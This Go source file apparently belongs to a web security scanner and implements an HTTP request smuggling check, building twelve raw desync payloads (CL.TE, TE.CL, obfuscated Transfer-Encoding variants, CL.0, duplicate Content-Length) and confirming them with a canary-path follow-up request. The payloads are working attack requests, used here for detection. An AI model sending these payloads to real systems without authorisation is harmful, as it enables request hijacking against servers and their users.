package modules

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/akha-security/akca/engine/internal/httpclient"
)

type smugglingVariant struct {
	name        string
	title       string
	description string
	buildRawReq func(host, path, canary string) string
}

var smugglingVariants = []smugglingVariant{
	{
		name:        "cl_te",
		title:       "HTTP Request Smuggling (CL.TE)",
		description: "Frontend proxy uses Content-Length while backend uses Transfer-Encoding, allowing HTTP request smuggling.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_cl",
		title:       "HTTP Request Smuggling (TE.CL)",
		description: "Frontend proxy uses Transfer-Encoding while backend uses Content-Length, allowing HTTP request smuggling.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n5e\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 10\r\n\r\nx=\r\n0\r\n\r\n",
				path, host, canary, host)
			return smuggledBody
		},
	},
	{
		name:        "te_te_space",
		title:       "HTTP Request Smuggling via Header Obfuscation (TE.TE Space)",
		description: "Backend parses obfuscated 'Transfer-Encoding : chunked' header while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding : chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_tab",
		title:       "HTTP Request Smuggling via Tab Header (TE.TE Tab)",
		description: "Backend parses 'Transfer-Encoding:\\tchunked' header while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding:\tchunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_prefix",
		title:       "HTTP Request Smuggling via Invalid Prefix (TE.TE xchunked)",
		description: "Backend strips invalid prefix 'Transfer-Encoding: xchunked' while frontend ignores it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: xchunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_crlf",
		title:       "HTTP Request Smuggling via Line Wrapping (TE.TE CRLF)",
		description: "Backend accepts multiline 'Transfer-Encoding:\\r\\n chunked' header while frontend normalizes it.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding:\r\n chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_dual",
		title:       "HTTP Request Smuggling via Dual Transfer-Encoding (TE.TE Dual)",
		description: "Backend and frontend differ in handling multiple conflicting Transfer-Encoding headers.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_comma",
		title:       "HTTP Request Smuggling via Comma-Separated TE (TE.TE Comma)",
		description: "Backend parses comma-separated 'Transfer-Encoding: chunked, identity' header.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked, identity\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_te_quote",
		title:       "HTTP Request Smuggling via Quoted Value (TE.TE Quote)",
		description: "Backend handles quoted 'Transfer-Encoding: \"chunked\"' while frontend ignores quotation marks.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nTransfer-Encoding: \"chunked\"\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "te_newline_lead",
		title:       "HTTP Request Smuggling via Leading Space Header (TE.TE Lead Space)",
		description: "Backend parses ' Transfer-Encoding: chunked' with leading space.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("0\r\n\r\nGET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), smuggledBody)
		},
	},
	{
		name:        "cl_zero",
		title:       "HTTP Request Smuggling via Zero Content-Length (CL.0 Desync)",
		description: "Backend ignores Content-Length: 0 on POST requests and treats trailing payload as subsequent request.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("GET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X\r\n\r\n", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, smuggledBody)
		},
	},
	{
		name:        "cl_cl_conflict",
		title:       "HTTP Request Smuggling via Conflicting Content-Length (CL.CL Conflict)",
		description: "Backend and frontend differ in resolving conflicting multiple Content-Length headers.",
		buildRawReq: func(host, path, canary string) string {
			smuggledBody := fmt.Sprintf("GET /akca-smuggle-%s HTTP/1.1\r\nHost: %s\r\nX-Ignore: X\r\n\r\n", canary, host)
			return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s",
				path, host, len(smuggledBody), len(smuggledBody)+50, smuggledBody)
		},
	},
}

func (r *Runner) runHTTPSmuggling(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("http_smuggling", target); !ok {
		r.emitSkip("http_smuggling", target, reason)
		return nil
	}

	u, err := url.Parse(target.EndpointURL)
	if err != nil || u.Hostname() == "" {
		return nil
	}

	baseline, baselineErr := r.cachedEmptyProbe(ctx, target)
	if baselineErr != nil || baseline.Response.StatusCode >= 500 {
		return nil
	}

	var out []ModuleFinding
	host := u.Host
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	port := "80"
	useTLS := strings.EqualFold(u.Scheme, "https")
	if useTLS {
		port = "443"
	}
	if u.Port() != "" {
		port = u.Port()
	}
	addr := net.JoinHostPort(u.Hostname(), port)

	for _, variant := range smugglingVariants {
		if ctx.Err() != nil {
			break
		}

		canary := randomProbeToken()
		rawAttack := variant.buildRawReq(host, path, canary)

		// 1. Send raw attack request over TCP/TLS connection
		conn, dialErr := dialTarget(ctx, addr, useTLS, u.Hostname(), r.cfg.InsecureSkipVerify)
		if dialErr != nil {
			continue
		}

		setConnDeadline(conn, ctx, 6*time.Second)
		_, wErr := io.WriteString(conn, rawAttack)
		if wErr != nil {
			conn.Close()
			continue
		}

		// Read response for attack request
		respReader := bufio.NewReader(conn)
		_, _ = readHTTPResponse(respReader)

		// 2. Send follow-up victim request over the same connection to verify if backend processed smuggled request
		normalReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host)
		_, _ = io.WriteString(conn, normalReq)

		victimStatus, victimBody := readHTTPResponse(respReader)
		conn.Close()

		// If follow-up response reflects 404 for smuggled path or returns error containing canary
		if (victimStatus == 404 && strings.Contains(victimBody, canary)) || (strings.Contains(victimBody, "akca-smuggle-"+canary)) {
			// Round 2 confirmation with a fresh connection to eliminate transient errors
			canary2 := randomProbeToken()
			rawAttack2 := variant.buildRawReq(host, path, canary2)

			conn2, err2 := dialTarget(ctx, addr, useTLS, u.Hostname(), r.cfg.InsecureSkipVerify)
			if err2 == nil {
				setConnDeadline(conn2, ctx, 6*time.Second)
				_, _ = io.WriteString(conn2, rawAttack2)
				respReader2 := bufio.NewReader(conn2)
				_, _ = readHTTPResponse(respReader2)

				_, _ = io.WriteString(conn2, normalReq)
				vStatus2, vBody2 := readHTTPResponse(respReader2)
				conn2.Close()

				if (vStatus2 == 404 && strings.Contains(vBody2, canary2)) || strings.Contains(vBody2, "akca-smuggle-"+canary2) {
					signal := "http_desync_" + variant.name
					p := defaultPayload("http_smuggling", signal, canary2, signal)
					rr := httpclient.RequestResponse{
						Request:  httpclient.RequestRecord{Method: "POST", URL: target.EndpointURL, Headers: map[string]string{"Transfer-Encoding": "chunked"}},
						Response: httpclient.ResponseRecord{StatusCode: vStatus2, Body: vBody2},
					}
					f := r.verifyAndBuild(ctx, "http_smuggling", target, p, baseline, rr, signal, false, false, "", "")
					if f != nil {
						f.Severity = "critical"
						f.Title = variant.title
						f.Description = variant.description + fmt.Sprintf(" Verified via smuggled prefix execution on '%s'.", target.EndpointURL)
						r.recordFinding(ctx, &out, f, "http_smuggling", signal)
						return out
					}
				}
			}
		}
	}

	return out
}

func dialTarget(ctx context.Context, addr string, useTLS bool, serverName string, skipVerify bool) (net.Conn, error) {
	d := net.Dialer{Timeout: 6 * time.Second}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, err
	}
	if useTLS {
		tlsConn := tls.Client(conn, &tls.Config{
			ServerName:         serverName,
			InsecureSkipVerify: skipVerify,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		})
		if err := tlsConn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	return conn, nil
}

func readHTTPResponse(reader *bufio.Reader) (int, string) {
	response, err := http.ReadResponse(reader, &http.Request{Method: http.MethodGet})
	if err != nil {
		return 0, ""
	}
	defer response.Body.Close()
	body, readErr := io.ReadAll(io.LimitReader(response.Body, 8192))
	if readErr != nil {
		return response.StatusCode, string(body)
	}
	return response.StatusCode, string(body)
}

func httpSmugglingSignalConfirmed(signal, body, expectedCanary string, status int) bool {
	if status <= 0 || !strings.HasPrefix(signal, "http_desync_") || strings.TrimSpace(body) == "" {
		return false
	}
	knownVariant := false
	for _, variant := range smugglingVariants {
		if signal == "http_desync_"+variant.name {
			knownVariant = true
			break
		}
	}
	if !knownVariant {
		return false
	}
	if expectedCanary != "" && strings.Contains(body, expectedCanary) {
		return true
	}
	return strings.Contains(body, "akca-smuggle-")
}
